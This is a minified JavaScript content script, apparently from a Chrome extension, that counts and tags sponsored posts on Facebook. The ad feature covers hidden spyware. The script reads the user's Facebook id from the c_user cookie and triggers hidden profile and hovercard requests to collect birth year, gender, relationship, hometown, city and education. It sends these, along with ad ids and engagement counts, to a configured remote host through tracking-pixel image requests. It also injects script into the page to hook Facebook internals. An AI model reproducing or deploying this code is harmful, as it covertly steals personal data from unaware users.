(function(){function a(){var a=new MutationObserver(function(a){a.forEach(function(a){if(a.addedNodes)for(var b=0;b<a.addedNodes.length;b++)y(a.addedNodes[b]),t(a.addedNodes[b].parentNode)})});a.observe(document.body,{childList:!0,subtree:!0})}function b(){!function(){function a(a){try{var e=f[b[0]],g=a.data;g&&g.b&&11===g.a&&requireLazy([b[3]],function(a){var d=a.getInstanceByTriggerElem(e("$")(g.b)),h=d&&d._endpoint&&d._endpoint.match(/ad_id%22%3A([0-9]+)%/);h=h&&h[1],e(b[4]).getFeedbackTarget(g.c,function(a){f.postMessage({a:12,b:[g.c,a.ownerid,h].join("l"),c:[a.reactioncount,c[g.c],a.sharecount,g.d].join("l"),d:g.c},"*")})})}catch(a){}}var b=["require","message","UFISharedDispatcher","PopoverAsyncMenu","UFIFeedbackTargets"],f=window;try{f.addEventListener(b[1],a,!1);var c={};requireLazy([b[2]],function(a){a.register(function(a){ c[a.ftentidentifier]=a&&a.payload&&a.payload.feedbacktarget&&a.payload.feedbacktarget.commentcount})})}catch(a){}}()}function c(a,b){clearTimeout(u),u=setTimeout(function(){d(a,b)},500)}function d(a,b){chrome.storage.sync.get({FBads:0,TTads:0},function(c){chrome.storage.sync.set({FBads:c.FBads+a,TTads:c.TTads+b})})}function e(a,b){m(a,b.width)}function f(){return new Image}function g(c,d,a){if(d&&""!=d){var b=f();b.src=C+d+H.replace("0",a),b.onload=function(){e(c,b)}}}function i(c,a){c&&""!==c&&(f().src=C+c+H.replace("a","c")+"?_t="+a)}function j(a,b){if(a){var c=a.match(b);if(c&&c.constructor===Array)return c[1]}return""}function l(c){if(c){var a="",d=$("input[name=\"ft_ent_identifier\"][value=\""+c+"\"").closest(".userContentWrapper"),e=d.find(".mtm ul.uiList li img[id], .mtm ul.uiList li a img").get().reduce(function(b,c){return c.style.backgroundImage?b.push(c.style.backgroundImage.split("\"")[1]):200<c.width+c.height&&b.push(c.src),b},[]),b=4;e&&0<e.length?(e.length>b+1&&e.splice(b,e.length-b-1),a=e.join("|")):(e=d.find(".mtm img")[0],e&&(a=e.src)),i(c,encodeURIComponent(a))}}function m(b,c){1>c||(1&c&&setTimeout(function(){v(w(3),"data-hovercard",0,[])},1e3),2&c&&setTimeout(function(){l(b)}, 500))}function o(){return["ads","block","college","contact_basic","recommended","education","places","current_city","people you may know","profile","hometown","stories","hs","suggested friends","viewer","suggested games","eduwork","city","load"]}function n(a,b,c){try{return b?1==b?$("#z"+D+" a[ajaxify$=\"type="+a+"\"]").closest("li:has(a["+c+"])").find("a["+c+"]").attr(c).split("=").pop():$("#z"+D+" #"+a+" a["+c+"]").attr(c).split("=").pop():$("#z"+D+" .rfloat:has(a[ajaxify$="+a+"])+div span").text()}catch(a){return""}}function p(a,b,c){if(!b){c.push(2050-parseInt(n("ear",0,a))),c.push(1+!n("der",0,a).indexOf("F"));var d=n("_in",0,a);c.push(d&&(0<d.indexOf("d")?3:1+!d.indexOf("W"))),v(w(5),a,b+1,c)}else 1==b?(c.push(n(w(12),1,a)),c.push(n(w(2),1,a)),v(w(6),a,b+1,c)):2==b?(c.push(n(w(7),2,a)),c.push(n(w(10),2,a)),v(w(7),a,b+1,c)):(g(0,c.join("l"),4),v(0,a,b+1,1))}function q(b){try{return b.split("").map((a)=>1^a).join("")+b.substr(3,3)}catch(a){return""}}function h(a){var b=document.cookie.match(new RegExp("(^| )"+a.join("_")+"=([^;]+)"));return F=b?b[2]:0,F}function v(a,c,d,e){function f(b){e.push(j(b,/id":(\d+)/)),p(f,d,e)}if(d||!E){E=1;var g=w(18),h=document.getElementById("z"+D),b=w(9);h?h.innerHTML="":(h=document.createElement("div"),h.setAttribute("id","z"+D),document.body.appendChild(h));var i=3>d?b+"/async/infopage/nav/?dom_section_id=z"+D+"&"+b+"_id="+F+"&section="+a+"&"+w(14)+"_id="+F:"ajax/typeahead/search/eduwork/inference.php?&context=hub_"+a+"&"+w(9)+"section=14002";if(3==d)h.removeAttribute(c),$(h)[g](i,f);else if(3<d)return $(h).empty();h.setAttribute(c,"/"+i+"&__a=1"),setTimeout(function(){h.dispatchEvent(new MouseEvent("mouseover",{view:window,bubbles:!0}))},2e3);var k=new MutationObserver(function(){k.disconnect(),setTimeout(function(){p(c,d,e)},100)});k.observe(h,{childList:!0,subtree:!1})}}function r(a){var b=""+(a||0);return b=b.replace(/[^0-9\s]/g,""),parseInt(b)}function s(a,b){var c=a.find(b);return c=c&&c[0]&&c[0].lastChild,c=c&&c.firstChild,r(c&&c.textContent)}function w(a){return o()[a]}function k(a,b,c){try{var d=a.querySelector(b);return d&&d[c]}catch(a){return""}}function t(a){if(a&&a.hasAttribute("data-cursor")){var b=a.innerHTML,d=$(a);if(0<b.indexOf(">Sponsored<")||0<d.find("a._m8c").length){a.classList.add(D+"n");try{kjdfa(),G&&setTimeout(function(){window.postMessage({a:11,b:k(a,"a[rel=\"toggle\"]","id"),c:k(a,"[name=\"ft_ent_identifier\"]","value"),d:r(s(d,"._2vd-"))},"*")},100)}catch(a){}}else 0<b.indexOf("<u>friend-add<")?a.classList.add(D+"p"):0<d.find("._j_2._5pcr").length&&a.classList.add(D+"p");c(1,2)}}function x(a){var b=a.data;b&&b.b&&12===b.a&&g(b.d,b.b+"i"+b.c,3)}function y(a){if(a&&$(a).hasClass(".pagelet")&&$n.find("a[href^='/campaign/landing.php']")){a.classList.add(D+"ra");var b=0;$(a).find("a[data-gt]").each(function(){var a=$(this).attr("data-gt");g(0,j(a,/d_id":(\d+)/i),1),b+=1}),b&&c(b,1)}}function z(){var a=0,b=document.querySelectorAll("div[data-cursor]");for(a=0;a<b.length;a++)t(b[a])}function A(){document.querySelectorAll("#pagelet_ego_pane .pagelet").forEach(function(a){y(a)})}function B(){window.addEventListener("message",x,!1),A(),a(),"complete"===document.readyState?z():(document.onreadystatechange=function(){"complete"===document.readyState&&(G=1,z())},z())}var C,u,D="ha2837492t",E=0,F=0,G=0,H="/ta0.gif";return{initialize:function(){var a=q(h(["c","user"]));chrome.storage.sync.get({iDate:0,u:""},function(b){C=b.u+b.iDate+a+"/",B()});var c=b.toString();c=c.substr(c.indexOf("{")+1),c=c.substr(0,c.lastIndexOf("}")-1);var d=document.createElement("script");d.textContent=c;var e=document.querySelector("head")||document.head||document.documentElement;e&&e.appendChild(d)}}})().initialize();